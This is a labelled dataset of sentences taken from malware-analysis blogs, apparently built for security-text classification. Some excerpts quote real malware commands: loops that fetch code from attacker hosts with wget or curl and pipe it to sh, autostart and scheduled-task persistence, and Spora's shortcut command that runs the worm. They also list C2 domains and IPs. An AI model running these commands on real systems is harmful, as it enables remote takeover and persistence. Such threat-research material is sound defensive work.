933	The other analyzed binaries from the repository (ffmpeg-10bit (MD5: 6d5bea9bfe014fc737977e006692ebf3, VT), ffprobe (MD5: 98f8600ff072625fd8ff6b3e14675648, VT), qt-faststart (MD5: e9b58b1e173734b836ed4b74184c320b, VT)) contained same pieces of shellcode, located at the same offsets from the end of files and used the same decryption routines.	1
934	The only small differences were in the hardcoded offsets.	1
935	The description (Easy Modbus TCP/UDP/RTU) and the file name (EasyModbusJava.jar) suggested that it contained the EasyModbus Java library.	1
936	I downloaded the most recent version (2.8, released on 2017-03-14) of EasyModbusJava.jar (MD5: 56668c3915a0aa621d7f07aa11f7c8a9, VT) from the official EasyModbus project page and compared it with EasyModbusJava.jar (MD5: 4d18388a9b351907be4a9f91785c9997, VT) from mansiiqkal/easymodbustcp-udp-java.	1
937	The code used a custom decryption routine to decrypt an array of bytes and then used resulting blob (3011 bytes in total, MD5: cf2ca657816af534c07c8ceca167e25b, VT) as a source of file content and strings (file names, system commands).	1
938	"Depending on the operating system type the code was executed on, it performed different actions described below: Linux The code dropped a JAR file (MD5: 9d4aeb737179995a397d675f41e5f97f) to $HOME/.local/share/bbauto and created a desktop entry persistence by setting $HOME/.config/autostart/none.desktop file to execute the following command: 1 /bin/sh -c ""java -jar $HOME/.local/share/bbauto"" The code also created an additional desktop entry $HOME/.config/autostart/.desktop set it to execute the following command: 1 /bin/sh -c while true;do wget hxxp://eln.duckdns[.]org/se -O -|sh;sleep 60;done' macOS The code dropped a JAR file (MD5: 9d4aeb737179995a397d675f41e5f97f) to $HOME/Library/LaunchAgents/AutoUpdater.dat and established persistence by creating a launch agent called AutoUpdater ($HOME/Library/LaunchAgents/AutoUpdater.plist)."	1
939	"The code also created an additional launch agent called SoftwareSync set to execute the following command: 1 /bin/sh -c while true;do curl hxxp://eln.duckdns[.]org/se -o -|sh;sleep 60;done' Windows The code dropped a JAR file (MD5: 9d4aeb737179995a397d675f41e5f97f) to %temp%\..\Microsoft\ExplorerSync.db and established persistence by executing following command: 1 schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f The dropped JAR file (MD5: 9d4aeb737179995a397d675f41e5f97f) and Windows file and scheduled task names (ExplorerSync.db, ExplorerSync) were exactly the same as discovered in the modified JXplorer Tcl installer script."	1
940	This created another plausible connection between the mansiiqkal/easymodbustcp-udp-java repository and modified Windows installer of JXplorer.	1
941	Each observed instance of Eimea Lite App was built into the LAME encoder tool, likely in order to thwart detection.	1
942	]org, lemonade.freeddns[.]org; contains two self signed certificates issued for Allesare Ltd. and supports similar set of commands as Java based FEimea Portable App: 1 CAPABILITY EIAPrev1.33 EAUTH SELECT EXAMINE STATUS PWD LIST STAT SEARCH ESEARCH RENAME HASH FETCH COPY APPEND LINK SYMLINK REMOVE ACCESS NOOP LOGOUT The most recent sample Aero.cpl (MD5: dd3a38ee6b5b6340acd3bb8099f928a8, VT) was uploaded to VirusTotal on 2018-11-25, which correlates with version string present in the file: 1 2 3 4 Eimea Lite app - ver.	1
943	3.11 Mainline Audio system : IMM Framework Audio codecs : pcm lame-mp3 opencore-amrnb soxr Build Nov 25 2018 11:54:25 Win32 This instance uses the same command and control servers that were observed in initially analyzed sample of the FEimea Portable App (MD5: 65579b8ed47ca163fae2b3dffd8b4d5a): limons.duckdns[.]org and polarbear.freeddns[.]org.	1
944	I previously mentioned that suspicious GitHub accounts and repositories created a confined network - however the graph also included entries that seemed to be a bit off.	1
945	However a look at a sample ELF binary (i686-w64-mingw32-addr2line, MD5: b54156221d1c5387b8de0eb4605dc3a0, VT) hosted in one of the repositories quickly proved I was wrong.	1
946	"The only difference was that shellcode was set to execute the following command: 1 /bin/sh -c cd /home/`whoami`/.config;mkdir autostart;cd autostart;>y echo [Desktop Entry];>>y echo Type=Application;>>y echo Exec=/bin/sh -c ""'while true;do wget hxxp://allesare.sourceforge[.]net/test/msg -O -|sh;sleep 60;done'"";chmod 755 y;mv y .desktop Overall there were 305 backdoored ELF binaries in nine GitHub repositories belonging to Andrew Dunkins."	1
947	Despite the name and description of the binary, the file included in that repository (supremebot.exe) turned out to be something else - something that I have seen previously and something that provided a great closure for this post.	1

1028	The primary purpose of this PE is to drop and load the DLL executable.	1
1029	It is downloaded as Cormac.mcr, but once extracted, the file name is converted into a randomized file name.	1
1030	It is installed into the %USERPROFILE% directory and then executed, creating a service by the same name.	1
1031	During its installation, a variety of other services also appear to be hooked, including lsass, lsm, and conhost, amongst others.	1
1032	The targets are in the United States or Canada, and those we were able to identify via IP are big defense contractors, as typical for Operation PawnStorm.	1
1033	Countermeasures Trend Micro is already able to protect users against this threat without any necessary updates.	1
1034	The existing Sandbox with Script Analyzer engine, which is part of Trend Micro™ Deep Discovery, can be used to detect this threat by its behavior.	1
1035	The Browser Exploit Prevention feature in the Endpoint Security in Trend Micro™ Smart Protection Suite detects the exploit once the user accesses the URL that hosted it.	1
1036	Our Browser Exploit Prevention detects user systems against exploits targeting browsers or related plugins.	1
1037	Vulnerability protection in Trend Micro Deep Security protects user systems from threats that may leverage this vulnerability with the following DPI rule: Oracle has also provided a security patch for the related vulnerability.	1
1038	The malware sample we analyzed was unusual for two reasons: Here are the file details: Hamas shoot down Israeli F-16 fighter jet by modern weapon in Gaza sea.doc- - - - - - - - - - - -.scr MD5: 7084f3a2d63a16a191b7fcb2b19f0e0d This malware was signed with a forged Microsoft certificate similar to previous XtremeRat samples.	1
1039	The malware dropped an instance of PIVY with the following configuration: ID: F16 08-07-2013 Group: DNS/Port: Direct: toornt.servegame.com:443, Proxy DNS/Port: Proxy Hijack: No ActiveX Startup Key: HKLM Startup Entry: File Name: Install Path: C:\Documents and Settings\Admin\Local Settings\Temp\morse.exe Keylog Path: C:\Documents and Settings\Admin\Local Settings\Temp\morse Inject: No Process Mutex: gdfgdfgdg Key Logger Mutex: ActiveX Startup: No HKLM Startup: No Copy To: No Melt: No Persistence: No Keylogger: No Password: !@#GooD#@!	1
1040	The PIVY sample in question had an MD5 hash of 9dff139bbbe476770294fb86f4e156ac and communicated with a CnC server at toornt.servegame.com over port 443.	1
1041	The key file used to secure communications contained the following ascii string ‘Password (256 bits):\x0d\x0aA9612889F6’ (where \x0d\x0a represents a line break).	1
1042	The 9dff139bbbe476770294fb86f4e156ac sample dropped a decoy document in Arabic that included a transcript of an interview with Salam Fayyad, the former Prime Minister of the Palestinian National Authority.	1
1043	The sample 16346b95e6deef9da7fe796c31b9dec4 was also seen communicating with toornt.servegame.com over port 443.	1
1044	This sample appears to have been delivered to its targets via a link to a RAR archive labeled Ramadan.rar (fc554a0ad7cf9d4f47ec4f297dbde375) hosted at the Dropbox file-sharing website.	1
1045	The sample a8714aac274a18f1724d9702d40030bf dropped a decoy document in Arabic that contained a biography of General Adbel Fattah el-Sisi – the Commander-in-Chief of the Egyptian Armed Forces.	1
1046	A recent sample (d9a7c4a100cfefef995785f707be895c) used protests in Egypt to entice recipients to open a malicious file.	1
1047	Another sample (b0a9abc76a2b4335074a13939c59bfc9) contained a decoy with a grim picture of Fadel Al Radfani, who was the adviser to the defense minister of Yemen before he was assassinated.	1
1048	In one such example we found the following link was used to host Ramadan.rar (fc554a0ad7cf9d4f47ec4f297dbde375): hxxps://dl[.]dropboxusercontent[.]com/s/uiod7orcpykx2g8/Ramadan.rar?token_hash=AAHAVuiXpTkOKwar9e0WH-EfrK7PEB9O7t7WC6Tgtn315w&dl=1 CnC Infrastructure We have found 15 PIVY samples that can be linked through common passwords, common CnC domain names, and common IP addresses to which the CnC domains resolve.	1
1049	The CnC servers for this cluster of activity are: Two of the domain names (natco2.no-ip.net and skype.servemp3.com) that were used as CnCs for PIVY were both documented as XtremeRat CnCs that were used in previous attacks.	1

analyst, threat actor investigator, cryptography enthusiast and software engineer.	1
1064	Starting with the most recently resolving Turla infrastructure, we were able to identify an SSL certificate associated with 83.229.75.141.	1
1065	Building off this overlap and open source intelligence, we used the certificate SHA-1 hash, f415844680ed9118ea74e0c7712b35044f0cc20d, as a pivot point and were able to chain the above IP address to 26 additional IP addresses..	1
1066	Using infrastructure chaining techniques, we were also able to surface nine additional dynamic DNS domains making use of two IP addresses, 169.255.100.152 and 217.194.149.111.	1
1067	It’s worth noting that while both IP addresses are active, only 169.255.100.152 continues to display the original SSL certificate used to make the connection while 217.194.149.111 appeared to have removed the certificate as of November 16th, 2015.	1

1099	The same ‘false flag’ approach was also found in the SWF-based exploit mentioned in our previous blogpost: MD5 hash Filename File Info Submitted 6dffcfa68433f886b2e88fd984b4995a cambio.swf Adobe Flash 2016-12-07 23:15 Here we’ll analyse these files as well as shed further light on the watering-hole exploit kit code itself, in the hope this aids further detection and network defence.	1
1100	The encryption consists of a running XOR, followed with RC4, using the 32-byte RC4 key below: A6 EB 96 0 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C A4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3C Sample #5 – fdsvc.dll The file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL (MD5: 889e320cf66520485e1a0475107d7419) by the aforementioned executable fdsvc.exe.	1
1101	"The initial request contains parameter pagenum set to 1 such as: ""GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1"" This begins the profiling and filtering to identify potential victims."	1
1102	"download_url + 14 ""&"" + PARAMNAME_STATUS + ""=2"" + 15 ""&"" + PARAMNAME_DATA + ""=""; For example, the URL string may look like: http://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data= Note that the pagenum parameter of the URL has now advanced to 3 (third step of the view.jsp execution)."	1
1103	Thus, the script will read and output the contents of 2 files stored on the web server: files/mark180789172360.ico files/back283671047171.dat The first file is likely a valid ICO file, is 318 bytes in size, and its contents are not encoded (hence the reason why the shellcode skips the first 318 bytes, and only decodes the rest).	1
1104	For example, the URL may look like: http://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&s=3 The appended URL will then be encoded the same way as the file back283671047171.dat: 1 for (int i #ERROR!	1
1105	The only difference is that the binary blob consists of these files: files/mark180789172360.ico, not encoded (318 bytes), as before files/meml102783047891.dat, encoded The 2nd file is now different, and the URL is no longer appended.	1
1106	"Indeed, as seen in the web log below, the last GET request with the pagenum=3 and s=3 parameters is served with a 123,710-byte response – large enough to accommodate a PE-executable: ""GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1"" 200 66148 ""POST /[PATH]/view.jsp HTTP/1.1"" 200 13991 ""GET /[PATH]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data= HTTP/1.1"" 200 4642 ""GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1"" 200 123710 NOTE: At the time of analysis, the ICO/DAT files were not available."	1

1265	We’ve outlined a few key differences we identified below: Malicious code was delivered in a single block of JavaScript on both webmailgoogle[.]com and foundationssl[.]com.	1
1266	]com and googlecaches[.]com selectively loaded extra plugins from separate files: Figure 1 – The JavaScript function to load additional plugins We can see how these differ by comparing two exploit kits side by side: Figure 2 – foundationssl[.	1
1267	Selectively loading plugins has the added bonus of slightly reducing access to the attacker’s code to researchers.	1
1268	Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function: Figure 3 – The empty JavaScript function that the exploit kit delivers when a browser doesn’t match a targeted browser The following ScanBox plugins are deployed on code.googlecaches[.]com, dependent upon the user's browser: Plugin ID Description Internet Explorer Chrome Firefox Safari 1 Software reconnaissance Y N N N 2 Browser plugin N Y Y Y 3 Flash recon Y Y Y Y 4 SharePoint recon Y N N N 5 Adobe PDF reader recon Y N N N 6 Chrome security plugins recon[2] N N Y* N 7 Java recon Y Y Y Y 8 Internal IP recon[3] N Y N N 9 JavaScript keylogger[4] Y Y Y Y Table 2 – A table of plugins loaded per browser on code.googlecaches[.]com.	1
1269	]com (left) and foundationssl[.]com (right) From a developer’s perspective, I know it’s always a good idea to check the details of any exceptions that occur when writing code in order to create more stable applications.	1
1270	Analysis of associated attacker infrastructure In order to potentially group the activity observed together, we analysed network infrastructure associated with the domains used by the attacker(s) deploying the ScanBox framework.	1
1271	Our analysis showed that there was little overlap both in terms of associated infrastructure and in terms of the malware families associated with that infrastructure.	1

1326	Posts on various forums referenced an IP address (146.185.239.3) contained in injected JavaScript code used on multiple compromised sites containing various PHP frameworks.	1
1327	The domains used by the threat actors for StealZilla and MalPuTTY currently resolve to this IP address, and previously used 144.76.120.243.	1
1328	Some of these domains include the current MalPutty domain (ngusto-uro.ru) along with previously seen go-upload.ru and aliserv2013.ru.	1
1329	The injected JavaScript uses the URI hxxp://146.185.239.3/sTDS/go.php, which appears to be running the Traffic Direction Systems (TDS) framework sTDS (a Russian-based project).	1

1332	Based on the domain briach202.no-ip.info, Talos was able to identify samples dating back to early January 2015 that were delivering the DarkKomet RAT.	1
1333	Network Communication Across all the samples Talos observed all the functionality was the same; Establish remote access to the system at briach202.no-ip.info.	1
1334	The way that DarkKomet operates is the infected system becomes the server and beacons out to the malicious actors client, briach202.no-ip.info.	1

to better identify its abilities, function and attack vectors.	1
1403	The following is a list of email addresses we have collected: Upon opening the attachment (488ba9382c9ee260bbca1ef03e843981), the victim is presented with a Word document (see Figure 2) that says “Дважды кликните, чтобы открыть резюме в Adobe Reader” which translates to “Double-click to open the resume in Adobe Reader.” Figure 2.	1
1404	Certificate used Infostealer Component Decoy Double-clicking on the embedded file (e426309faa42e406e5c0691bf5005781), which we call KRIPTOVOR.Infostealer, launches a decoy document.	1
1405	Aside from this registry key, it checks if a mutex named “rocs” exists.	1
1406	Payload Download After it installs the certificate, it downloads a file from hxxp://plantsroyal[.]org/css/salomon.rar into the user folder as temporary.rar then extracts the file into the %USERPROFILE% folder.	1
1407	AdobeUpdate key is added to HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce The extracted file, which is the ransomware component (described below under Ransomware Component), has the following attributes: File: AdobeSystem.exe Size: 1596456 MD5: 00e3b69b18bfad7980c1621256ee10fa Compiled Date: Fri, Jan 16 2015 18:02:18 - 32 Bit KRIPTOVOR.Infostealer also sends an email with the process list and a screenshot of the desktop to notify the attacker that things have gone well with the victim’s machine.	1
1408	HTTP headers for the POST request Ransomware Component Decrypting Strings KRIPTOVOR.Ransomware (00e3b69b18bfad7980c1621256ee10fa) retrieves two items from its resource section.	1
1409	Mutex gordon The UPX packed PE file (6fc98a27bda791282ba101ac696bffa1) first checks if a mutex named “gordon” exists.	1
1410	One of the most active of the redirection domains is click2.systemaffiliate[.]com, which was recently documented by Zscaler here.	1
1411	The traffic is distributed across five IPs.	1
1412	199.212.255.136 199.212.255.137 199.212.255.138 199.212.255.139 199.212.255.140 Reverse DNS on the five IPs shows they resolve to multiple hostnames, including names that reference characters from the Teenage Mutant Ninja Turtles franchise.	1
1413	Figure 2 – Some of the domains / host names associated with the five IPs Note that although it has been the most active, click2.systemaffiliate[.]com was not alone in its redirection mischief.	1
1414	click2.danarimedia[.]com preceded it in redirecting to Exploit Kits in the exact same manner; it is also linked to the same five IPs.	1
1415	This resulted in another 302 redirect to searchwebfind[.]org, which then redirected yet again to the “news4news” themed domains.	1
1416	There were multiple combinations of redirection domains & referrer activity, here we see megafinder24[.]info, another rogue domain, leading to Angler.	1
1417	MD5: F924CEC68BE776E41726EE765F469D50 This post was first available on Visa Threat Intelligence, the first product available from the partnership between Visa Inc. and FireEye.	1
1418	Ringster has a hardcoded URL pointing to mpjunkie[.]com.	1
1419	This indicates that multiple C2 servers were used in this campaign, but one (37.1.207.31) was the most heavily used.	1

1439	A Closer Look at the Mamba Ransomware that Struck San Francisco Rail System Blog Threat Research A Closer Look at the Mamba Ransomware that Struck San Francisco Rail System By Joie Salvio | December 5 2016 Recently, the San Francisco Municipal Transportation Agency, also known as MUNI, was attacked by a new variant of Mamba (a.k.a HDDCryptor) – a disk-encypting ransomware.	1
1440	The incident left their ticketing services with inoperational systems and a note that read, “You Hacked,ALL Data Encrypted,Contact For Key(cryptom27@yandex.com)” Fortinet first discovered Mamba two months ago.	0
1441	Since then, it has been under the radar – until this big attack.	0
1442	We will now take a look at a few irregularities and some new developments it has employed over the past few months.	0
1443	Ransom Note This is the very same ransom note that could be found in the infected systems in Muni – using the same attacker email and ID.	0
1444	This is the primary reason why we think this is the malware that hit Muni.	0
1445	Fig.1 Ransom note of the new Mamba ransomware Installation As in the previous version, this variant of Mamba installs the legitimate disk-encryption tool, DiskCryptor, along with other components for encrypting network shares.	1
1446	This time, the installation directory is “%SystemRoot%/Users/WWW/” For some reason, as of this writing, the website of DiskCryptor is inaccessible.	1
1447	Apparently, it has been down for at least two months - around the same time that it was first seen being used by Mamba ransomware.	0
1448	A notable irregularity is found in the installed mount.exe component, which was used to encrypt network-shared files.	1
1449	In this variant, the component dropped is still encrypted.	0
1450	Fig.2 Encrypted mount.exe We expected that it will be decrypted at some point, and executed.	0
1451	However, the malware continued to try and execute the file as it is, but obviously, nothing happens.	0
1452	This is a very confusing behavior.	0
1453	The log message about network share encryption has also been removed.	0
1454	It’s possibile that the real intention was to disable the feature, but there is surely a better way to do that.	0
1455	Fig.3 Executing the encrypted mount.exe Another irregularity is the fact that it tries to find a directory that it has not created, but was used in a previous variant’s installation – “%SystemRoot%/Users/ABCD”.	1
1456	Obfuscation In this version, most of the strings that it uses are already encoded by Base64 algorithm.	0
1457	Although this is not a very complicated obfuscation, it can still be effective against signatures based on the plain strings from the older version.	0
1458	Fig.4 Base64-encoded API strings And it still uses plain text for logging its status.	0
1459	Fig.5 Mamba status log Conclusion There’s no big development between the first Mamba sample that we discovered and this new one.	0
1460	It is the same simple and direct ransom malware - no fancy encryptions, anti-sandbox, or anti-debugging mechanisms.	0
1461	So how was this simple ransomware able to land a big blow to one of the largest transit systems in United States?	0
1462	As we keep on reiterating, the effectiveness of an attack relies heavily on how it gets into systems.	0
1463	It does not matter how dangerous, simple, or complicated a payload is.	0
1464	If it doesn’t have an effective way to force itself inside systems, it’s just a bullet with no gun to fire it.	0
1465	In the case of Muni, reports suggest* that the malware may have been installed by exploiting a vulnerability related to an unpatched Oracle server program.	0
1466	It’s an old vulnerability, and a simple update to patch the system could have saved them a lot of money, along with a great deal of inconvenience and public embarrassment.	0

1469	Finding the RAT's Nest - OpenDNS Umbrella Blog Blog Finding the RAT’s Nest By Andrea Scarfo January 18 2017 Subscribe We’ve spotted a Remote Access Trojan(RAT) and are headed down into the unknown.	0
1470	In this blog post we’re going to examine some malicious infrastructure that we’ve found by pivoting through domains delivering and communicating with RATs.	0
1471	A RAT is malware that creates a back door to gain access to the target and its connected resources in order to spy/steal information, drop additional malware such as ransomware, or to enlist the target into a botnet for DDoS purposes.	0
1472	A RAT can basically give all of the same access to a system that the attacker would have if they were physically accessing the target.	0
1473	A RAT has many functionalities: remote desktop control, webcam and microphone control, keylogger, remote shell, crypto miner, download and execute functionalities, screen capturing.	0
1474	Purchase and Preparation When deciding on which RAT to setup and spread, there is a choice between free or paid varieties.	0
1475	There are RATs that are free to use and RATs that require one to pay for a license.	0
1476	They vary in their ease of setup and stability.	0
1477	Since these RATs have been available for years and are detectable through signatures, a “crypter” is used on the malware before deployment.	0
1478	Crypters are tools that can use encryption and obfuscation on the malware in an effort to make them FUD (Fully UnDetectable) against known pattern based or behavior based signatures used in Anti-Virus or IDS/IPS systems.	0
1479	When a low detection rate is reached they have a better chance of infecting targets.	0
1480	The goal is to appear to be a harmless program.	0
1481	Once crypted, criminals run the file through underground scan services that will tell them their file’s achieved detection rate.	0
1482	The ease of setup and availability of these RATs have helped them remain a threat.	0
1483	There are also rental services, offering to do all of the setup needed to build the infrastructure for RATs and bots, and then rent the use of them for a price.	0
1484	Advertisement for RAT and Botnet Setup Services LuminosityLink is widely considered by some cyber criminals to be one of the best RATs.	0
1485	When searching for only one AV signature from Malwarebytes, Backdoor.LuminosityLink, in Virustotal with a First Submission date of the last 30 days; there were 147 new submissions.	1
1486	On our resolvers, we see active traffic to the Command and Control (C2) panels and infrastructure behind these RATs.	0
1487	LuminosityLink Let’s investigate some infrastructure around this paid RAT, LuminosityLink.	0
1488	In The Wild LuminosityLink is seen here dropped from this site, http://onsitepowersystems[.]com/invoice86291320[.]zip, which appears to be exploited with the C99 Shell.	1
1489	The delivery method is a bit.ly link leading to the zip file at onsitepowersystems[.]com.	1
1490	The C2 communications are at 191.101.22[.]47.	1
1491	LuminosityLink ZIP on compromised website The bit.ly link as well as the onsitepowersystems[.]com zip file are still active at the time of this analysis.	1
1492	As a side note, OpenDNS offers the optional filtering of the URL Shortener category on your network.	0
1493	While URL shorteners are not malicious by design, removing access to them can help protect your users from clicking on links that will redirect them to unexpected places.	0

1520	Spora - the Shortcut Worm that is also a Ransomware MENU Spora - the Shortcut Worm that is also a Ransomware 01/18/2017 G DATA Blog Spora spreads via USB drives like Gamarue and Dinihou aka Jenxcus whilst also encrypting files.	0
1521	The sophistication of this threat could easily make it the new Locky.	0
1522	We discuss its infection and encryption procedure and show how it uses statistical values about encrypted files to calculate the ransom amount.	0
1523	HTA email Attachment as common infection vectorSpora's ransom note was first spotted by the ID Ransomware maintainers and announced via Twitter by MalwareHunterTeam.	0
1524	Several malware researchers and Twitter users were amazed by the good-looking, professional ransomware website and ransom note.	0
1525	Experience showed that most of these websites are in a bad shape.	0
1526	The first sample was provided by a member of Bleepingcomputer and discussed in their Spora support topic.This sample is an HTA application with obfuscated VBScript code.	0
1527	According to Bleepingcomputer it arrived in a ZIP archive via email attachment.	0
1528	Submissions on VirusTotal show the filename Скан-копия _ 10 января 2017г.	1
1529	Составлено и подписано главным бухгалтером.	0
1530	Экспорт из 1С.a01e743_рdf.hta.The HTA file writes a JScript file to %TEMP%\close.js and executes it.	1
1531	The JScript file in turn is a dropper for a Word document that is written to %TEMP%\doc_6d518e.docx and a PE file that is saved to %TEMP%\81063163ded.exe.	1
1532	Both files are opened by close.js, the Word document with a parameter to show and focus the window, and the PE file with a parameter to hide it.	1
1533	As a result the document will be opened by the set default application for .docx files, e.g., Word, but an error message is shown because it is corrupt.	0
1534	The PE file 81063163ded.exe has a seemingly random name, but it is actually hardcoded by the dropper.	1
1535	The PE file is UPX packed and contains the actual payload.	1
1536	Error message, appears after opening the corrupt document Worm-like behavior similar to Dinihou and GamarueWhile ZCryptor had already been deemed a combination of ransomware and worm due to its usage of autorun.inf, Spora goes some steps further using the same techniques as Gamarue and Dinihou.	0
1537	The functionality of autorun.inf had been removed in Windows 7 and was patched on Windows XP and Windows Vista more than seven years ago, thus making it an ineffective technique for worms to spread via removable drives.	0
1538	The trick is: Gamarue, Dinihou and now also Spora use Windows shortcuts (.LNK files) instead.Spora adds the hidden attribute to files and folders on the desktop, in the root of removable drives and the system drive.	0
1539	These hidden files and folders are, with the standard folder options, not visible anymore.	0
1540	Spora then puts Windows shortcuts with the same name and icon as the hidden files and folders as a visible replacement.	0
1541	Those .LNK files open the original file to avoid raising any suspicion and simultaneously execute the malware.	0
1542	An example: the folder C:\Windows will be hidden and a file named C:\Windows.lnk will be created; it looks exactly like the original folder if the standard folder options on Windows are set.The .LNK files use the following command to execute the worm and open the original file.	0
1543	"If the original file is a folder it will open Windows Explorer to show its contents:/c explorer.exe ""<originalfile>"" & type ""<worm>"" > ""%%tmp%%\<worm>"" & start ""<originalfile>"" ""%%tmp%%\<worm>""The worm copies itself as hidden file alongside the .LNK files, its filename is generated by calculating the CRC32 checksum for the VolumeSerialNumber."	1
1544	The result is put into the pattern %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02 (see address 0x405492).	0
1545	This means, the name for the malware file can be, e.g., a277a133-ecde-c0f5-1591-ab36e22428bb.exe.	1
1546	This function calculates the CRC32 based on the VolumeSerialNumber of the disk .LNK files and a copy of the malware have been created in the root of the system drive.	1
1547	The worm deletes the registry value HKCR\lnkfile\isShortcut with the effect that the shortcut icons don't show the characteristic bent arrow in the lower left corner, which would be telltale sign to the user that something is wrong.Simply navigating through the folders on your system and desktop using double-click will execute the worm.	1
1548	Using this strategy, it will not only spread to removable drives like USB thumb drives, it will also encrypt newly created files on the system.	0
1549	This renders the system unusable, for storing or working on any pictures or documents, until it is disinfected.	0
1550	Function that deletes the isShortcut value in the registry EncryptionSpora actually does not rename encrypted files and targets a comparably small set of extensions.	1
1551	The encryption procedure is shown in the diagram below..backup, .7z, .rar, .zip, .tiff, .jpeg, .jpg, .accdb, .sqlite, .dbf, .1cd, .mdb, .cd, .cdr, .dwg, .psd, .pdf, .odt, .rtf, .docx, .xlsx, .doc, .xls The Spora encryption shown in an info graphic Spora generates a pair of RSA keys, C1 and C2 (1024 bit).	1
1552	This newly generated public RSA key C2 is used to encrypt the per-file AES keys which are also generated by Spora.	0
1553	The generated private RSA key C1 on the other hand is stored in the .KEY file.	0
1554	That file is encrypted using a newly generated AES Key B (256 bit).	1
1555	The attacker's public RSA key A2 is used to encrypt AES key B.	0
1556	The encrypted key B is appended to the .KEY file.	0
1557	The figure below shows the code that writes the .KEY file's content including the encrypted AES key B to disk.A second important file is the .LST file which contains a list of all encrypted files.	0
1558	Its encryption works analogous to the .KEY file encryption.	0
1559	A new AES key is generated, used to encrypt the .LST contents, encrypted by the public RSA key A2 of the attacker and appended to the .LST file in encrypted form (see screenshot below): The encrypted content of the .KEY file and the encrypted AES Key are written to disk AES key F is encrypted by public RSA key A and the .LST file contents are encrypted using AES key F (256 bit).	1
1560	Using this encryption scheme, Spora does not have to obtain a key from a command and control server and can work offline.	0
1561	The user has to upload the .KEY file to the payment site.	0
1562	The .KEY file is only decryptable by the ransomware authors.	0
1563	Using their private RSA key A1 they could decrypt the AES Key B that was appended to the .KEY file.	0
1564	They could decrypt the remaining .KEY file contents including the user's private RSA key C1 using AES key B.	0
1565	Then they may put the private RSA key C1 into a decrypter that they send to the user after they have received the payment.	0
1566	This handling ensures that the attackers' private RSA key A1 is not exposed and that the decrypter only works for one user.However, this also means that there is only one private RSA key A1 for several infections.	0
1567	If that key is leaked or obtained by law enforcement, it can be used to decrypt all files that were encrypted by this variant of Spora and as such we can consider it a master key.	0
1568	The Spora payment site includes a chat system and provides several decryption packages with varying prices Statistics about encrypted filesSpora counts the number of encrypted files for six different extension categories.	0
1569	They are listed in the table below.Position/IDCategoryFile Extensions1Office Document.odt, .rtf, .docx, .xlsx, .doc, .xls2PDF.pdf3CorelDraw, AutoCAD, Photoshop.cdr, .dwg, .psd4Database.accdb, .sqlite, .dbf, .1cd, .mdb, .cd5Image.tiff, .jpeg, .jpg6Archive.backup, .7z, .rar, .zipThe .KEY file saves these statistical values in the form date|user name|locale|cat1|cat2|cat3|cat4|cat5|cat6, e.g.	1
1570	13.1.2017|horst|USA|10|2|3|0|103|51The same statistics will be used for the naming scheme of the .LST file, the .KEY file and the ransom note.	0
1571	Let's take the following triplet of .KEY file, .LST file and ransom note as example.The first two letters of the filename are the locale which is RU in our example.	0
1572	The following five letters are the first characters of the MD5 hash for the contents of the .KEY file, in our example 30215'.	0
1573	The counters start right after the MD5 substring at the 8th letter.	0
1574	They have to be decoded using the substitution table below: 123456789IPaddingZXROAHFGEKTYThat means the file name RU302-15XRK-GXTFO-GZTET-KTXFF-ORTXA-AYYYY translates to Russia as location, the characters 30215' for the beginning of the MD5 hash, 12971 encrypted office documents, 6370 encrypted PDF, 8 encrypted CorelDraw/AutoCAD/Photoshop files, 9 encrypted database files, 16632 encrypted images and 144 encrypted archives.After uploading the .KEY file to Spora's payment website, the ransom amount will be calculated depending on the number of encrypted files.	0

1588	OSX Malware is Catching Up, and it wants to Read Your HTTPS Traffic (updated) | Check Point Software Blog Toggle navigation OSX Malware is Catching Up, and it wants to Read Your HTTPS Traffic (updated) Research by: Ofer Caspi People often assume that if you’re running OSX, you’re relatively safe from malware.	0
1589	But this is becoming less and less true, as evidenced by a new strain of malware encountered by the Check Point malware research team.	0
1590	This new malware – dubbed OSX/Dok — affects all versions of OSX, has 0 detections on VirusTotal (as of the writing of these words), is signed with a valid developer certificate (authenticated by Apple), and is the first major scale malware to target OSX users via a coordinated email phishing campaign.	1
1591	Once OSX/Dok infection is complete, the attackers gain complete access to all victim communication, including communication encrypted by SSL.	0
1592	This is done by redirecting victim traffic through a malicious proxy server.	0
1593	The malware mostly targets European users.	0
1594	For instance, one phishing message was observed to target a user in Germany by baiting the user with a message regarding supposed inconsistencies in their tax returns (see image, and translation, below).	0
1595	____ Update – May-4-2017 Our ongoing investigation of the OSX/DOK campaign have led us to detect several new variants of this malware.	0
1596	Following Apple’s revocation of the previous developer ID, it seems the attackers have quickly adapted and are now using a new Apple developer ID.	0
1597	These new variants also contain an extra obfuscated layer using UPX in an attempt to avoid security products detection.	0
1598	Apple has been notified about these new developments, and the new developer ID has now been revoked.	0
1599	Check Point customers remain protected against these threats with the following detections: IOCs: ____ Technical details: The malware bundle is contained in a .zip archive named Dokument.zip.	1
1600	It was signed on April 21th 2017 by a “Seven Muller” and the bundle name is Truesteer.AppStore.	1
1601	Upon execution, the malware will copy itself to the /Users/Shared/ folder, and will then proceed to execute itself from the new location by running the shell commands below: Then, the malware will pop-up a fabricated message claiming that “the package is damaged” and therefore cannot execute: If a loginItem named “AppStore” exists, the malware will delete it, and instead add itself as a loginItem, which will persist in the system and execute automatically every time the system reboots, until it finishes to install its payload.	1
1602	The malicious application will then create a window on top of all other windows.	0
1603	This new window contains a message, claiming a security issue has been identified in the operating system that an update is available, and that to proceed with the update, the user has to enter a password as shown in the picture below.	0
1604	The malware checks the system localization, and supports messages in both German and English.	0
1605	The victim is barred from accessing any windows or using their machine in any way until they relent, enter the password and allow the malware to finish installing.	0
1606	Once they do, the malware gains administrator privileges on the victim’s machine.	0
1607	Using those privileges, the malware will then install brew, a package manager for OS X, which will be used to install additional tools – TOR and SOCAT Tor, the latter is a low-level command-line utility that allows connection to the dark web.	1
